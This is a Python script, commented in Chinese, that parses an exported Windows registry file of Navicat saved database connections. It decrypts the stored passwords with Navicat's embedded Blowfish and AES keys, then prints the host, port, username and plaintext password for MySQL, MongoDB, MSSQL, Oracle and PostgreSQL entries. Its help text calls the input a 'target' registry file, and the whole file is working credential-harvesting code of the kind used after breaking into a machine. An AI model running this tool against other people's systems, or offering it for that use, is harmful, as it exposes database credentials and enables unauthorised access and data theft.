# 安装crypto可参考网上解决方案

import configparser
import sys,os
import argparse



from Crypto.Hash import SHA1
from Crypto.Cipher import AES, Blowfish
from Crypto.Util import strxor,Padding


class Navicat11Crypto:

    def __init__(self, Key = b'3DC5CA39'):
        self._Key = SHA1.new(Key).digest()
        self._Cipher = Blowfish.new(self._Key, Blowfish.MODE_ECB)
        self._IV = self._Cipher.encrypt(b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF')

    def EncryptString(self, s : str):
        if type(s) != str:
            raise TypeError('Parameter s must be a str.')
        else:
            plaintext = s.encode('ascii')
            ciphertext = b''
            cv = self._IV
            full_round, left_length = divmod(len(plaintext), 8)

            for i in range(0, full_round * 8, 8):
                t = strxor.strxor(plaintext[i:i + 8], cv)
                t = self._Cipher.encrypt(t)
                cv = strxor.strxor(cv, t)
                ciphertext += t
            
            if left_length != 0:
                cv = self._Cipher.encrypt(cv)
                ciphertext += strxor.strxor(plaintext[8 * full_round:], cv[:left_length])

            return ciphertext.hex().upper()

    def DecryptString(self, s : str):
        if type(s) != str:
            raise TypeError('Parameter s must be str.')
        else:
            plaintext = b''
            ciphertext = bytes.fromhex(s)
            cv = self._IV
            full_round, left_length = divmod(len(ciphertext), 8)

            for i in range(0, full_round * 8, 8):
                t = self._Cipher.decrypt(ciphertext[i:i + 8])
                t = strxor.strxor(t, cv)
                plaintext += t
                cv = strxor.strxor(cv, ciphertext[i:i + 8])
            
            if left_length != 0:
                cv = self._Cipher.encrypt(cv)
                plaintext += strxor.strxor(ciphertext[8 * full_round:], cv[:left_length])
            
            return plaintext.decode('ascii')

class Navicat12Crypto(Navicat11Crypto):

    def __init__(self):
        super().__init__()


    def DecryptStringForNCX(self, s : str):
        cipher = AES.new(b'libcckeylibcckey', AES.MODE_CBC, iv = b'libcciv libcciv ')
        padded_plaintext = cipher.decrypt(bytes.fromhex(s))
        return Padding.unpad(padded_plaintext, AES.block_size, style = 'pkcs7').decode('ascii')


def decrypt(cpass):
    try:
        return Navicat11Crypto().DecryptString(cpass[1:-1])
    except:
        return f"解密失败！-> {cpass[1:-2]}" 

def parsePort(port : str):
    return str(int(port.split(":")[1],16))


def formatReg(file):
    f = open(file,'r',encoding='utf-16')
    f.seek(82)
    f2 = open(file+".format",'w')
    f2.write(f.read())
    f.close()
    return os.path.join(os.getcwd(),file+".format")
    # os.remove(path)

def print_info(l,host,port,Username,password):
    sys.stdout.write(l.split("\\")[-1]+"\n")
    sys.stdout.write("Host: "+host+"\n")
    sys.stdout.write("Port: "+port+"\n")
    sys.stdout.write("Username: "+Username+"\n")
    sys.stdout.write("Pwd: "+password+"\n")
    sys.stdout.write("================\n\n")

def print_banner(server):
    sys.stdout.write("========================================================\n")
    sys.stdout.write(f"=========================={server}=========================\n")
    sys.stdout.write("========================================================\n")

def main(path : str):
    config = configparser.ConfigParser()
    config.read(path)

    host_list = config.sections()
    mysql_server_reg = r"HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers"
    mongo_server_reg = r"HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMongoDB\Servers"
    mssql_server_reg = r"HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers"
    oracle_server_reg = r"HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers"
    postgres_server_reg = r"HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers"
    print_flag = [0,0,0,0,0]
    for l in host_list:
        if mysql_server_reg in l:
            if print_flag[0] == 0:
                print_banner("mysql")
                print_flag[0]=1
            # 说明存在主机
            if len(l) > len(mysql_server_reg):
                print_info(l,config[l][r'"Host"'],parsePort(config[l][r'"Port"']),config[l][r'"Username"'],decrypt(config[l][r'"Pwd"']))
        elif mongo_server_reg in l:
            if print_flag[1] == 0:
                print_banner("mongo")
                print_flag[1] = 1
            if len(l) > len(mongo_server_reg):
                print_info(l,config[l][r'"Host"'],parsePort(config[l][r'"Port"']),config[l][r'"Username"'],decrypt(config[l][r'"Pwd"']))
        elif mssql_server_reg in l:
            if print_flag[2] == 0:
                print_banner("mssql")
                print_flag[2] = 1
            if len(l) > len(mssql_server_reg):
                print_info(l,config[l][r'"Host"'],parsePort(config[l][r'"Port"']),config[l][r'"Username"'],decrypt(config[l][r'"Pwd"']))
        elif oracle_server_reg in l:
            if print_flag[3] == 0:
                print_banner("oracle")
                print_flag[3] = 1
            if len(l) > len(oracle_server_reg):
                print_info(l,config[l][r'"Host"'],parsePort(config[l][r'"Port"']),config[l][r'"Username"'],decrypt(config[l][r'"Pwd"']))
        elif postgres_server_reg in l:
            if print_flag[4] == 0:
                print_banner("postgres")
                print_flag[4] = 1
            if len(l) > len(postgres_server_reg):
                print_info(l,config[l][r'"Host"'],parsePort(config[l][r'"Port"']),config[l][r'"Username"'],decrypt(config[l][r'"Pwd"']))

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-f","--file",type=str,help="the path of target reg")
    args = parser.parse_args()


    path = formatReg(args.file)
    main(path)


        

